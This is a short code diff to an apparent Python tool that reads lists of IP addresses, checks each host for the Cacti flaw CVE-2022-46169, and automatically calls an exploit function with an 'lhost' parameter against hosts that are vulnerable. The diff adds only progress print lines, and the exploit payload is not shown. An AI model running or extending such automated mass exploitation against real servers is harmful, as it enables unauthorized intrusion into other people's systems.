@@ -181,10 +181,12 @@ def detect_and_exploit_vulnerabilities_from_file(filename, lhost, level):
             if len(data) >= 2:
                 ip = data[0]
                 port = data[1]
+                print(f"Processing Check Vulnerability: {ip}")
                 result, vuln_result = detect_cacti_vulnerability(ip, port, level)
                 if "Cacti vulnerability detected." in result:
                     print(f"CVE-2022-46169 Vulnerability Detected: {ip}")
                     if vuln_result:
+                        print(f"Processing Exploit: {ip}")
                         exploit_cacti(ip, port, lhost)
                 else:
                     print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")
@@ -211,10 +213,12 @@ def detect_and_exploit_vulnerabilities_from_public(filename, lhost, level):
             if len(data) >= 2:
                 ip = data[0]
                 port = data[1]
+                print(f"Processing Check Vulnerability: {ip}")
                 result, vuln_result = detect_cacti_vulnerability(ip, port, level)
                 if "Cacti vulnerability detected." in result:
                     print(f"CVE-2022-46169 Vulnerability Detected: {ip}")
                     if vuln_result:
+                        print(f"Processing Exploit: {ip}")
                         exploit_cacti(ip, port, lhost)
                 else:
                     print(f"No CVE-2022-46169 Vulnerability Detected: {ip}")
